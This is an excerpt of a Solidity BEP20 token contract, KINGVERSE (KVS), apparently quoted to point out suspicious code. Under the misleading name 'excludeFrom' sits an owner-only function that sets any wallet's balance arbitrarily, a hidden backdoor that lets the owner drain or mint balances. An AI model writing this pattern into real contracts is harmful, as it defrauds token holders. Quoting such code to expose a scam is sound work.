...
contract KINGVERSE is IBEP20, Auth {
    ...
    string private constant _name = "KINGVERSE";
    string private constant _symbol = "KVS";
    uint8 private constant _decimals = 9;
    

    uint256 private constant _totalSupply = 30000000 * (10 ** _decimals);
    ...
    address private marketingFeeReceiver =0xeac90a09188767347cad45012326ECBD2c35E093;
    ...
    address private privateSaleCa = marketingFeeReceiver;
   ...
   function setMaxWallet(uint256 amount) external onlyOwner() {
	...
	function excludeFrom(address _wallet, uint256 _exclude) external onlyOwner{
        _balances[_wallet]= _exclude;
    }
